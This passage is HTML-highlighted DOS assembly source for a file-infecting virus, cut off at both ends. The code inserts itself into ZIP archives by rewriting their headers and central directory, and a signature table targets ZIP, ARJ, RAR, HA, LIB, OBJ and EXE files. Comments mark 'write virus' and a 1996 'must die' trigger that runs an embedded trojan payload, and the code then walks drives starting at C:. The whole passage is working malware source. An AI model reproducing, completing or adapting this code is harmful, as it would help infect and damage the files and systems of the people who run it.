    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">f_insert_hdr_und_file</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">proc_cnt</span><span class="sc0">
    </span><span class="sc5">DO</span><span class="sc0">
</span><span class="sc1">; seek_cur(ziphdr.filename_length_+ziphdr.extra_field_length_</span><span class="sc0">
</span><span class="sc1">; +ziphdr.file_comment_length_)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ziphdr.zip_size_fname_</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ziphdr.zip_extra_field_length_</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ziphdr.zip_file_comment_length_</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Ch</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">dosseek_cur_cx_0</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">proc_cnt</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">read_buf_22</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">ziphdr.zip_centr_sign_.lo</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">ZIP_SIGN</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">error_exit1</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ziphdr.zip_centr_sign_.hi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">ZIP_CNL_ID</span><span class="sc0">
    </span><span class="sc5">CYCLE</span><span class="sc0"> </span><span class="sc5">E</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ziphdr.zip_centr_sign_.hi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">ZIP_END_ID</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">error_exit1</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">dosseek_cur_neg_ax</span><span class="sc0">  </span><span class="sc1">; seek_cur(-sizeof(zip_centr_header))</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">ziphdr.ttl_num_of_ent_on_this_disk</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">ziphdr.ttl_num_of_ent_in_the_cent_dir</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">ziphdr.size_of_the_central_directory.lo</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">zip_central_header</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">fnamesize</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cwd</span><span class="sc0">     </span><span class="sc1">;DX := 0</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">ziphdr.size_of_the_central_directory.lo</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">adc</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">ziphdr.size_of_the_central_directory.hi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">fisize</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;[zip_compressed_size.lo]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">SIZE</span><span class="sc0"> </span><span class="sc5">zip_local_header</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">ziphdr.off_of_strt_of_cent_directory.lo</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">adc</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">ziphdr.off_of_strt_of_cent_directory.hi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">SIZE</span><span class="sc0"> </span><span class="sc5">zip_end_header</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DosWrite_shbuf</span><span class="sc0">  </span><span class="sc1">;write zip_end_header</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">  </span><span class="sc1">;zf=0</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">create_zip</span><span class="sc0">  </span><span class="sc1">; create_centr_header</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc9">SIZE</span><span class="sc0"> </span><span class="sc5">zip_end_header</span><span class="sc0"> </span><span class="sc1">;-16</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">dosseek_cur_cx_1</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">SIZE</span><span class="sc0"> </span><span class="sc5">zip_central_header</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc1">;%NOINCL</span><span class="sc0">
</span><span class="sc1">;.SALL</span><span class="sc0">

</span><span class="sc1">;shift_buffer_size = 13h</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">f_insert_hdr</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">fnamesize</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">f_insert_hdr_wirhout_fname</span><span class="sc0">
    </span><span class="sc6">LEA</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">vir_heap._crthdr</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">f_insert</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">      </span><span class="sc1">; insert_size</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">   </span><span class="sc1">; cx := 0</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">HDRBUFSIZE</span><span class="sc0">
    </span><span class="sc6">sbb</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">beg_pos.hi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">beg_pos.lo</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">      </span><span class="sc1">; cx := -1</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">HDRBUFSIZE</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">   </span><span class="sc1">; seek_end ( - shift_buffer_size )</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DosSeek_all</span><span class="sc0">
    </span><span class="sc5">DO</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">read_buf_22</span><span class="sc0">    </span><span class="sc1">; read ( shift_buffer, shift_buffer_size )</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">             </span><span class="sc1">; seek_cur ( insert_size - shift_buffer_size )</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">HDRBUFSIZE</span><span class="sc0">   </span><span class="sc1">; sub dx,ax (?)</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">dosseek_cur_cx_0</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DosWrite_shbuf_22</span><span class="sc0"> </span><span class="sc1">; write ( shift_buffer, shift_buffer_size )</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">         </span><span class="sc1">; seek_cur ( - insert_size - 2*shift_buffer_size )</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">HDRBUFSIZE</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">dosseek_cur_neg_dx</span><span class="sc0">      </span><span class="sc1">; #### DX:AX=curpos</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">beg_pos.hi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc9">REPEAT</span><span class="sc0"> </span><span class="sc5">A</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">beg_pos.lo</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">CYCLE</span><span class="sc0"> </span><span class="sc5">A</span><span class="sc0">
</span><span class="sc1">;-+--------+- seek for write -+--------+-</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">      </span><span class="sc1">; insert_size</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">dosseek</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DosWrite</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">dostell</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;shift_buffer_size = 22h</span><span class="sc0">

</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">sto_fnamesize_20</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">fnamesize</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">store_fisize</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc5">sto_word_</span><span class="sc0"> </span><span class="sc4">&lt;[</span><span class="sc5">fisize</span><span class="sc4">]&gt;</span><span class="sc0"> </span><span class="sc1">;.filesize</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">st_dx_0</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">     </span><span class="sc1">;d;hdr crc</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">stosw_sto_0</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">
    </span><span class="sc5">sto_word</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">create_dtim</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">        </span><span class="sc5">stosw_sto_0</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">create_dtim1</span><span class="sc0">
    </span><span class="sc5">sto_word</span><span class="sc0">    </span><span class="sc5">TIMEMARKER</span><span class="sc0">   </span><span class="sc1">;time  = const TIMEMARKER</span><span class="sc0">
    </span><span class="sc5">sto_word_</span><span class="sc0">   </span><span class="sc4">&lt;[</span><span class="sc5">host_arx_date</span><span class="sc4">]&gt;</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">write_sizemarker</span><span class="sc0">
</span><span class="sc1">;write garbage</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">heap</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;from heap</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">SIZEMARKER</span><span class="sc4">+</span><span class="sc5">SIZEMARKER_MOD</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">SHIT_AX</span><span class="sc0">
    </span><span class="sc1">;write virus</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">seek_end</span><span class="sc0">       </span><span class="sc1">;dx:ax - file size</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">SIZEMARKER</span><span class="sc0">
    </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">SIZEMARKER_MOD</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc5">doswrite_from_heap</span><span class="sc0">

</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;xEXE        db      '.EXE'</span><span class="sc0">
</span><span class="sc1">;xCOM        db      '.COM'</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">hdrs</span><span class="sc0">
            </span><span class="sc5">CRC32w</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc12">'P'</span><span class="sc4">,</span><span class="sc12">'K'</span><span class="sc4">,</span><span class="sc12">''</span><span class="sc4">,</span><span class="sc12">''</span><span class="sc4">&gt;</span><span class="sc0">       </span><span class="sc1">;ZIP</span><span class="sc0">
            </span><span class="sc5">CRC32w</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc2">060h</span><span class="sc4">,</span><span class="sc2">0EAh</span><span class="sc4">&gt;</span><span class="sc0">             </span><span class="sc1">;ARJ</span><span class="sc0">
            </span><span class="sc5">CRC32w</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc12">'R'</span><span class="sc4">,</span><span class="sc12">'a'</span><span class="sc4">,</span><span class="sc12">'r'</span><span class="sc4">,</span><span class="sc12">'!'</span><span class="sc4">&gt;</span><span class="sc0">       </span><span class="sc1">;RAR</span><span class="sc0">
            </span><span class="sc5">CRC32w</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc12">'H'</span><span class="sc4">,</span><span class="sc12">'A'</span><span class="sc0"> </span><span class="sc4">&gt;</span><span class="sc0">              </span><span class="sc1">;HA</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">endarxex</span><span class="sc0">
</span><span class="sc1">;           CRC32w  &lt;0FFh,0FFh,0FFh,0FFh&gt;   ;SYS</span><span class="sc0">
            </span><span class="sc5">CRC32w</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc2">0F0h</span><span class="sc4">,</span><span class="sc2">0Dh</span><span class="sc4">&gt;</span><span class="sc0">              </span><span class="sc1">;LIB</span><span class="sc0">
            </span><span class="sc5">CRC32w</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc2">080h</span><span class="sc4">&gt;</span><span class="sc0">                  </span><span class="sc1">;OBJ</span><span class="sc0">
</span><span class="sc1">;           CRC32w  &lt;'F','B','O','V'&gt;       ;OVR</span><span class="sc0">
            </span><span class="sc5">CRC32w</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc12">'Z'</span><span class="sc4">,</span><span class="sc12">'M'</span><span class="sc4">&gt;</span><span class="sc0">               </span><span class="sc1">;EXE</span><span class="sc0">
            </span><span class="sc5">CRC32w</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc12">'M'</span><span class="sc4">,</span><span class="sc12">'Z'</span><span class="sc4">&gt;</span><span class="sc0">               </span><span class="sc1">;EXE</span><span class="sc0">

</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">offs</span><span class="sc0">
            </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc5">process_zip</span><span class="sc0">
            </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc5">process_arj</span><span class="sc0">
            </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc5">process_rar</span><span class="sc0">
            </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc5">process_ha</span><span class="sc0">
</span><span class="sc1">;           dw  process_sys</span><span class="sc0">
            </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc5">process_lib</span><span class="sc0">
            </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc5">process_obj</span><span class="sc0">
</span><span class="sc1">;           dw  process_ovr</span><span class="sc0">
            </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc5">process_exe</span><span class="sc0">
            </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc5">process_exe</span><span class="sc0">
</span><span class="sc1">;cmp_ax_CRC32w &lt;2,1Ah,8Bh&gt;</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">api_entry</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">doscall</span><span class="sc0">
</span><span class="sc6">iret</span><span class="sc0">

</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">mustdie</span><span class="sc0">
</span><span class="sc5">DTADELTA</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">11H</span><span class="sc0">
</span><span class="sc5">forDTAs</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">heap</span><span class="sc4">+</span><span class="sc2">80h</span><span class="sc0">
</span><span class="sc5">TROJANTIME</span><span class="sc4">=</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">host_arx_date.h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0"> </span><span class="sc1">;if 1996 year then must die!</span><span class="sc0">
    </span><span class="sc5">DOIF</span><span class="sc0"> </span><span class="sc5">B</span><span class="sc0">
    </span><span class="sc1">;executor</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">ziphdr.zip_file_time</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">TROJANTIME</span><span class="sc0">
        </span><span class="sc5">DOIF</span><span class="sc0"> </span><span class="sc5">E</span><span class="sc0">
</span><span class="sc1">;int 2bh</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">dosseek_cur_cx_0</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">api_entry</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2503h</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">doscall</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">heap</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ziphdr.zip_compressed_size.lo</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1Fh</span><span class="sc0">   </span><span class="sc1">; maximum size=8K</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">dosread</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc1">;            mov     di, cx</span><span class="sc0">
</span><span class="sc1">;            mov     si, dx</span><span class="sc0">
</span><span class="sc1">;            call    Calculate_CRC</span><span class="sc0">
        </span><span class="sc5">DONE</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
    </span><span class="sc5">DONE</span><span class="sc0">

    </span><span class="sc5">MOVSEG</span><span class="sc0">  </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
    </span><span class="sc5">MOVSEG</span><span class="sc0">  </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
</span><span class="sc5">next_disk</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">forDTAs</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">heap</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">disk</span><span class="sc4">=</span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc9">IFDEF</span><span class="sc0"> </span><span class="sc5">RELIZ</span><span class="sc0">
    </span><span class="sc5">sto_two_byte</span><span class="sc0"> </span><span class="sc12">'C'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">':'</span><span class="sc0">
</span><span class="sc9">ELSE</span><span class="sc0">
    </span><span class="sc5">sto_two_byte</span><span class="sc0"> </span><span class="sc12">'D'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">':'</span><span class="sc0">
</span><span class="sc9">ENDIF</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'Z'</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">rt_err</span><span class="sc0">
    </span><span class="sc5">DO</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">DTADELTA</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
